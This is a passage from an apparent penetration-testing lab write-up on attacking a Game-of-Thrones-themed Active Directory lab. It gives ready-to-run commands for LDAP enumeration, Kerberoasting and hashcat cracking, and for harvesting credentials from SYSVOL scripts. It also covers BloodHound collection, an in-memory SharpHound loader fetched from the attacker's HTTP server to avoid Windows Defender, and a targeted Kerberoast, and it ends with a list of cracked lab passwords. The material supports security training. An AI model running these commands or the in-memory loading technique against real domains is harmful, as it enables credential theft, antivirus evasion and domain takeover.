If one valid account is found, the `impacket` tool `GetADUsers` can be used to get a list of all valid users. This tool achieves that using automated `LDAP` queries. It can be used with an account like this:
```bash
impacket-GetADUsers -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# also try with ESSOS.LOCAL/missandei:fr3edom
```

### Manual LDAP queries
It is also possible to issue manual `LDAP` queries to get more information out of the domain controllers using the tool `ldapsearch` as follows:
```bash
ldapsearch -H ldap://10.3.10.11 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "<LDAP_Query>" | grep 'name'
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -H: LDAP URI (Host)
# -D: Domain Name
# -w: Password
# -b: LDAP query. Also try 'DC=sevenkingdoms,DC=local' and `DC=essos,DC=local`
```

If a trusted link between multiple domains exist, they can also be passed into the `-d` parameter for enumeration. The following `LDAP` query which lists all users of a domain:
```bash
"(&(objectCategory=person)(objectClass=user))"
```
 This query works for the `DC01` (`KINGSLANDING`), and the `DC02`(`WINTERFELL`), and returns all users. There are many more `LDAP` queries which may be used, found [here](https://www.politoinc.com/post/ldap-queries-for-offensive-and-defensive-operations). They can be used to find more information about delegations, GPOs, groups, trusts, and so on.

An alternative to `ldapsearc` can be `netexec`, as it can also be used to send `LDAP` queries as follows:
```bash
nxc ldap 10.3.10.11 -u 'north.sevenkingdoms.local\brandon.stark' -p 'iseedeadpeople' -d 'essos.local' --query "<LDAP_Query>" "" | grep 'name'
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# also allows for enumeration of other domains
```

### Kerberoasting
`Kerberoasting` is the act of specifically searching for users which have a registered `Service Principal Name` (`SPN`). These are typically service accounts for the SQL server or IIS application. For these accounts, a `Kerberos` `Ticket Granting Service` (`TGS`) can be requested, which is usually a normal operation in an AD environment. These tickets may be cracked offline!

The tool for `Kerberoasting` is `GetUserSPNs` from the `impacket` suite and it is usable as follows:
```bash
impacket-GetUserSPNs north.sevenkingdoms.local\brandon.stark:iseedeadpeople -dc-ip 10.3.10.11 -request
```
Alternatively, `netexec` may also be used to do this task:
```bash
nxc ldap 10.3.10.11 -u 'brandon.stark' -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting hash.txt
```

Using this technique, i have gathered the `Kerberos` tickets for the users `sansa.stark`, `sql_svc` and `jon.snow`. A cracking attempt can now be made to get the clear-text password for these accounts. The tool for this job will be `hashcat` in mode `13100` (`Kerberos 5, etype 23, TGS-REP`). This command then attempts cracking the hashes:
```bash
hashcat -m 13100 ./hash.txt ./rockyou.txt
```
This gave me the new clear-text credentials of `NORTH/jon.snow:iknownothing`.

### Authenticated Share enumeration
Using valid credentials, the available `SMB` shares may be enumerated once again to find out if some accounts may have more `READing` or `WRITEing` privileges using this command:
```bash
nxc smb 10.3.10.10-23 -u 'brandon.stark' -p 'iseedeadpeople' -d north.sevenkingdoms.local --shares
```
After trying this with other accounts, the account of `robb.stark` is able to access the `SYSVOL` share on `WINTERFELL`:
```bash
smbclient -U 'NORTH\robb.stark' --password='sexywolfy' "//north.sevenkingdoms.local/SYSVOL"
```

The `SYSVOL` share may hold scripts which can leak clear-text credentials. And in this case, i have found `script.ps1` and `secret.ps1`, which reveal the clear-text credentials for `NORTH/jeor.mormont:_L0ngCl@w_`.

### DNS Dump
It may be also possible to enumerate the integrated DNS in an active-directory environment using these commands:
```bash
adidnsdump -u 'north.sevenkingdoms.local\brandon.stark' -p 'iseedeadpeople' winterfell.north.sevenkingdoms.local
```
```bash
# alternatively:
```
```bash
bloodyAD --host "10.3.10.11" -d "north.sevenkingdoms.local" -u "brandon.stark" -p "iseedeadpeople" get dnsDump
```
```bash
# alternatively:
```
```bash
nxc smb -u 'brandon.stark' -p 'iseedeadpeople' -d 'north.sevenkingdoms.local' -M enum_dns
```

### Bloodhound
`bloodhound` is a tool which uses multiple `LDAP` queries to create a big `ZIP` file containing information about the active directory environment. This `ZIP` can then be uploaded to the `bloodhound` GUI, where a mapping of all users and their permissions can be viewed to find privilege escalation or lateral movement paths.

To collect this data, a so-called `ingestor` (`collector`) is required. If code execution on the machine is not present, it can be achieved remotely using `bloodhound-python`, or `netexec`'s built-in `ingestor` as follows:
```bash
bloodhound-python -d north.sevenkingdoms.local -u 'brandon.stark' -p 'iseedeadpeople' -dc winterfell.north.sevenkingdoms.local  --zip -c All -ns 10.3.10.11
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -c: Collection methods: All
# -ns: DNS server IP, for correct name resolution (usually DC)
```

```bash
# alternatively, netexec:
```

```bash
nxc ldap north.sevenkingdoms.local -u 'brandon.stark' -p 'iseedeadpeople' --bloodhound --collection All --dns-server 10.3.10.11
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# --bloodhound: perform multiple `LDAP` scans to save in a file which can be investigated with bloodhound
# --collection All: Collection methods: All
# --dns-server: DNS server IP, for correct name resolution (usually DC)
```

The problem with these remote `ingestors` is that they do not collect all data. A collector which returns a more complete dataset is `SharpHound`. As this collector is an `executable` file which needs to run on the target, code execution on the machine is required. Protocols which enable code execution are `Remote Desktop` or `winrm`. A connection can be set-up as follows:
```bash
xfreerdp3 /u:brandon.stark /p:iseedeadpeople /d:north.sevenkingdoms.local /v:10.3.10.11 /cert:ignore
```
```bash
# or winrm:
```
```bash
evil-winrm -i 10.3.10.11 -u brandon.stark -p iseedeadpeople
```

The `SharpHound.exe` must be downloaded from the [SharpHound GitHub](https://github.com/SpecterOps/SharpHound), and unzipped. For a `Remote Desktop` session, the `exe` can be put on the system using simple `Copy-Paste`, and for the `winrm` session, the command `upload SharpHound.exe .` can be used. To execute the `binary` on the target, this command may be used:
```powershell
./SharpHound.exe -d north.sevenkingdoms.local -c All --OutputDirectory C:\ --ZipFileName north.zip
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# also execute this for 'sevenkingdoms.local' and 'essos.local'
```

The resulting `ZIP` files may then be inspected for dangerous permissions of users.

The problem with this upload of the file is that `Windows Defender` will block any suspicious file from landing on the file-system using signature checks! Therefore, an alternative approach of executing `Sharphound` is to be running it entirely in memory and not placing any malicious `.exe` on the disk. To do so, the file must be served in a `python3 -m http.server`. It can then be fetched into memory and executed using the following commands:
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://<my-IP>:<port>/SharpHound.exe')
```
This fetches the `SharpHound.exe` file from the `http` server and stores it in the variable `$data`. The following command is used to load the `data` into memory:
```powershell
$assem = [System.Reflection.Assembly]::Load($data)
```
And lastly, the binary can be executed as follows:
```powershell
[Sharphound.Program]::Main(@("-d","north.sevenkingdoms.local","-c","All","--OutputDirectory","C:\","--ZipFileName","north.zip"))
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# also execute this for 'sevenkingdoms.local' and 'essos.local'
```

`AMSI` (`Anti Malware Scan Interface`) may block this attempt. It was not the case in the testing, but if `AMSI` were present, it can be bypassed. A [blog post](https://infosecwriteups.com/bypass-amsi-in-powershell-a-nice-case-study-f3c0c7bed24d) describes this bypass very nicely.

To install the actual `bloodhound-gui`, the following command can be issued on debian machines:
```bash
sudo apt update && sudo apt install -y bloodhound
```
The `setup` is pretty self-explanatory:
```bash
sudo bloodhound-setup
```
```bash
# and then:
```
```bash
sudo bloodhound-start
```

Some tips and tricks for the usage of `bloodhound` are:

- By searching a user where the credentials are known, the `Outbound Object Permissions` show you all permissions on other objects which apply to the current user.
- Clicking the lines on dangerous permissions shows you the step-by-step exploitation steps.
- Under `PATHFINDING` a start/target can be set to show you the quickest way to that target.
- A user can be right-clicked and the option `Mark User as Owned` can be used to mark that you have access to this user.
- The `Shortes Paths to Here from Owned Principals` can be used to easily find exploitation paths to e.g. `Administrator`.
- `Notes` can be used to note down clear-text passwords.

### Cypher-queries
`bloodhound` allows you to query the data using a language called `cypher` (similar to `SQL`, but for graph data). These queries may show interesting information:
```cypher
MATCH p = (d:Domain)-[r:Contains*1..]->(n:Computer) RETURN p
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# > Shows all domains and computers
```

```cypher
MATCH p = (d:Domain)-[r:Contains*1..]->(n:User) RETURN p
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# > Shows all domains and users
```

```cypher
MATCH q=(d:Domain)-[r:Contains*1..]->(n:Group)<-[s:MemberOf]-(u:User) RETURN q
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# > Shows a map of domains / groups and their relationships
```

```cypher
MATCH p=(u:User)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 'vagrant' RETURN p
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# > Shows access controls of the AD
```

```cypher
MATCH (n:User {name: "USERNAME@DOMAIN.LOCAL"})-[r]->(m)
RETURN n, r, m
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# > Shows all outgoing paths from a user
```

These are only a few, but more can be found [here](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/) and  [here](https://github.com/ThePorgs/Exegol-images/blob/3d6d7a41e46acb6898da996c4198971be02e4d77/sources/bloodhound/customqueries.json)!

### GenericAll Abuse
If a user has `GenericAll` privileges over another user, multiple attack scenarios open up. A targeted `Kerberoast` is made possible. In the test-lab, the user `MISSANDEI@ESSOS.LOCAL` has `GenericAll` permissions over the account `KHAL.DROGO@ESSOS.LOCAL`. To do the targeted `Kerberoast`, the tool `targetedKerberoast.py` from [this Github](https://github.com/ShutdownRepo/targetedKerberoast) may be used as follows after using `git clone` on it:
```bash
python3 ./targetedKerberoast.py -v -d 'essos.local' -u 'missandei' -p 'fr3edom'
```

The `Kerberos` hash of this user is once again gained, which can be cracked using mode `13100` (`Kerberos 5, etype 23, TGS-REP`) of `hashcat` as follows:
```bash
hascat -m 13100 ./hash.txt ./rockyou.txt
```
This gives me the new credentials of `khal.drogo:horse`.

### Summary of users
```bash
NORTH/samwell.tarly:Heartsbane # Anonymous SMB enum, Password in tje Desc.
NORTH/arya.stark:Needle # SMB Guest-access, Password in a file
NORTH/brandon.stark:iseedeadpeople # AS-REP Roasting, Hash cracked
ESSOS/missandei:fr3edom # AS-REP Roasting, Hash cracked
NORTH/robb.stark:sexywolfy # LLMNR Attack, Hash cracked
NORTH/hodor:hodor # Password Spray, name=pass
NORTH/rickon.stark:Winter2022 # Password Spray, guessable password

#-- New users: --
NORTH/jon.snow:iknownothing  # Kerberoasting, Hash cracked
NORTH/jeor.mormont:_L0ngCl@w_ # Cleartext Password in SYSVOL share
ESSOS/khal.drogo:horse # targeted Kerberoast, Hash cracked
```
